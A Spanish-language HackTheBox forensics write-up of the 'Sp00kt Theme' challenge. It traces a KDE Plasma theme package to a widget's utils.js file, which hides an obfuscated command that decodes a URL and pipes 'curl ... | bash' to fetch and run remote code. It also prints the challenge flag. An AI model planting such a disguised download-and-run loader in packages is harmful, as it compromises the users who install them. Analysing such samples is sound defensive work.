---
title: "HackTheBox - Challenge Sp00kt Theme"
summary: "Vamos a ver el paso a paso detallado de como ir resolviendo el challenge:"
date: "2025-04-03"
draft: false
tags:
- Tutorial
- HackTheBox
- Challenge
- Forensics
---

### Paso a paso:


- Descargo el archivo .zip que me dan para el ejercicio.

<div style="height: 5px;"></div>

- Lo muevo a mi carpeta de trabajo.

<div style="height: 5px;"></div>

- Y lo descomprimo usando unzip, acordarse que la contrasena siempre va a ser "hackthebox": 

<div style="height: 5px;"></div>

- Entro al archivo y empiezo a mirar y pido un tree para ver ordenadamente todo lo que contiene el directorio:
```js
┌──(root㉿kali)-[/home/joaquin/HTB/Challenge/plasma]
└─# tree
.
├── desktoptheme
│   └── Otto
│       ├── colors
│       ├── dialogs
│       │   └── background.svgz
│       ├── icons
│       │   ├── akonadi.svgz
│       │   ├── akregator.svgz
│       │   ├── amarok.svgz
│       │   ├── applications.svgz
│       │   ├── apport.svgz
│       │   ├── audio.svgz
│       │   ├── battery.svgz
│       │   ├── bookmarks.svgz
│       │   ├── cantata.svgz
│       │   ├── computer.svgz
│       │   ├── configure.svgz
│       │   ├── device.svgz
│       │   ├── disk.svgz
│       │   ├── distribute.svgz
│       │   ├── document.svgz
│       │   ├── drive.svgz
│       │   ├── edit.svgz
│       │   ├── fcitx.svgz
│       │   ├── go.svgz
│       │   ├── ime.svgz
│       │   ├── input.svgz
│       │   ├── kalarm.svgz
│       │   ├── kdeconnect.svgz
│       │   ├── keyboard.svgz
│       │   ├── kget.svgz
│       │   ├── kgpg.svgz
│       │   ├── kleopatra.svgz
│       │   ├── klipper.svgz
│       │   ├── kmail.svgz
│       │   ├── konversation.svgz
│       │   ├── konv_message.svgz
│       │   ├── kopete.svgz
│       │   ├── korgac.svgz
│       │   ├── kpackagekit.svgz
│       │   ├── kruler.svgz
│       │   ├── kteatime.svgz
│       │   ├── ktorrent.svgz
│       │   ├── kup.svgz
│       │   ├── list.svgz
│       │   ├── mail.svgz
│       │   ├── media.svgz
│       │   ├── mobile.svgz
│       │   ├── network.svgz
│       │   ├── notification.svgz
│       │   ├── osd.svgz
│       │   ├── phone.svgz
│       │   ├── plasmavault_error.svgz
│       │   ├── plasmavault.svgz
│       │   ├── preferences.svgz
│       │   ├── printer.svgz
│       │   ├── quassel.svgz
│       │   ├── search.svgz
│       │   ├── slc.svgz
│       │   ├── software.svgz
│       │   ├── start.svgz
│       │   ├── system.svgz
│       │   ├── touchpad.svgz
│       │   ├── user.svgz
│       │   ├── video-card.svgz
│       │   ├── video.svgz
│       │   ├── view.svgz
│       │   ├── vlc.svgz
│       │   ├── wallet.svgz
│       │   ├── window.svgz
│       │   ├── yakuake.svgz
│       │   └── zoom.svgz
│       ├── metadata.json
│       ├── plasmarc
│       ├── weather
│       │   └── wind-arrows.svgz
│       └── widgets
│           ├── actionbutton.svgz
│           ├── action-overlays.svgz
│           ├── analog_meter.svgz
│           ├── arrows.svgz
│           ├── background.svgz
│           ├── bar_meter_horizontal.svgz
│           ├── bar_meter_vertical.svgz
│           ├── branding.svgz
│           ├── busywidget.svgz
│           ├── button.svgz
│           ├── calendar.svgz
│           ├── checkmarks.svgz
│           ├── clock.svgz
│           ├── configuration-icons.svgz
│           ├── containment-controls.svgz
│           ├── dragger.svgz
│           ├── frame.svgz
│           ├── glowbar.svgz
│           ├── lineedit.svgz
│           ├── line.svgz
│           ├── listitem.svgz
│           ├── margins-highlight.svgz
│           ├── media-delegate.svgz
│           ├── menubaritem.svgz
│           ├── monitor.svgz
│           ├── notes.svgz
│           ├── pager.svgz
│           ├── panel-background.svgz
│           ├── picker.svgz
│           ├── plasmoidheading.svgz
│           ├── plot-background.svgz
│           ├── radiobutton.svgz
│           ├── scrollbar.svgz
│           ├── scrollwidget.svgz
│           ├── slider.svgz
│           ├── switch.svgz
│           ├── tabbar.svgz
│           ├── tasks.svgz
│           ├── timer.svgz
│           ├── toolbar.svgz
│           ├── tooltip.svgz
│           ├── translucentbackground.svgz
│           └── viewitem.svgz
├── look-and-feel
│   └── Otto
│       ├── contents
│       │   ├── defaults
│       │   ├── layouts
│       │   │   └── org.kde.plasma.desktop-layout.js
│       │   └── previews
│       │       ├── fullscreenpreview.jpg
│       │       └── preview.png
│       └── metadata.json
└── plasmoids
    └── org.kde.netspeedWidget
        ├── contents
        │   ├── code
        │   │   └── utils.js
        │   ├── config
        │   │   ├── config.qml
        │   │   └── main.xml
        │   └── ui
        │       ├── CompactRepresentation.qml
        │       ├── config
        │       │   ├── AppMenuDialog.qml
        │       │   ├── AppPicker.qml
        │       │   ├── ColorPicker.qml
        │       │   ├── ConfigAdvanced.qml
        │       │   └── ConfigGeneral.qml
        │       ├── Launcher.qml
        │       └── main.qml
        └── metadata.json

19 directories, 131 files
```

<div style="height: 5px;"></div>

- Le pido que me muestre todo pero sin los .svgz y sin las carpetas:
```js
┌──(root㉿kali)-[/home/joaquin/HTB/Challenge/plasma]
└─# find . ! -name \*.svgz -type f                         
./desktoptheme/Otto/metadata.json
./desktoptheme/Otto/colors
./desktoptheme/Otto/plasmarc
./plasmoids/org.kde.netspeedWidget/metadata.json
./plasmoids/org.kde.netspeedWidget/contents/code/utils.js
./plasmoids/org.kde.netspeedWidget/contents/ui/Launcher.qml
./plasmoids/org.kde.netspeedWidget/contents/ui/CompactRepresentation.qml
./plasmoids/org.kde.netspeedWidget/contents/ui/main.qml
./plasmoids/org.kde.netspeedWidget/contents/ui/config/AppPicker.qml
./plasmoids/org.kde.netspeedWidget/contents/ui/config/ColorPicker.qml
./plasmoids/org.kde.netspeedWidget/contents/ui/config/ConfigAdvanced.qml
./plasmoids/org.kde.netspeedWidget/contents/ui/config/ConfigGeneral.qml
./plasmoids/org.kde.netspeedWidget/contents/ui/config/AppMenuDialog.qml
./plasmoids/org.kde.netspeedWidget/contents/config/config.qml
./plasmoids/org.kde.netspeedWidget/contents/config/main.xml
./look-and-feel/Otto/metadata.json
./look-and-feel/Otto/contents/layouts/org.kde.plasma.desktop-layout.js
./look-and-feel/Otto/contents/previews/fullscreenpreview.jpg
./look-and-feel/Otto/contents/previews/preview.png
./look-and-feel/Otto/contents/defaults
```

<div style="height: 5px;"></div>

- Y le pido abrir lo con batcat:
```js
┌──(root㉿kali)-[/home/joaquin/HTB/Challenge/plasma]
└─# find . ! -name \*.svgz -type f | xargs batcat -l python
```

<div style="height: 5px;"></div>

- Al revisar todo encuentro un echo:
```js
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: ./plasmoids/org.kde.netspeedWidget/contents/code/utils.js
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ const NET_DATA_SOURCE =
   2   │     "awk -v OFS=, 'NR > 2 { print substr($1, 1, length($1)-1), $2, $10 }' /proc/net/dev";
   3   │ 
   4   │ const PLASMOID_UPDATE_SOURCE = 
   5   │     "UPDATE_URL=$(echo 952MwBHNo9lb0M2X0FzX/Eycz02MoR3X5J2XkNjb3B3eCRFS | rev | base64 -d); curl $UPDATE_URL:19
       │ 92/update_sh | bash"
   6   │ 
   7   │ function parseTransferData(data) {
   8   │     const transferData = {};
   9   │ 
  10   │     for (const line of data.trim("\n").split("\n")) {
  11   │         const [name, rx, tx] = line.split(",");
  12   │ 
  13   │         if (name === "lo") {
  14   │             continue;
  15   │         }
  16   │ 
  17   │         transferData[name] = { rx, tx };
  18   │     }
  19   │ 
  20   │     return transferData;
  21   │ }
  22   │ 
  23   │ function calcSpeedData(prevTransferData, nextTransferData, duration) {
  24   │     const speedData = {};
  25   │
```

<div style="height: 5px;"></div>

- Lo ejecuto y descubro la flag:
```js
┌──(root㉿kali)-[/home/joaquin/HTB/Challenge/plasma]
└─# echo 952MwBHNo9lb0M2X0FzX/Eycz02MoR3X5J2XkNjb3B3eCRFS | rev | base64 -d      
HTB{pwn3d_by_th3m3s!?_1t_c4n_h4pp3n} 
```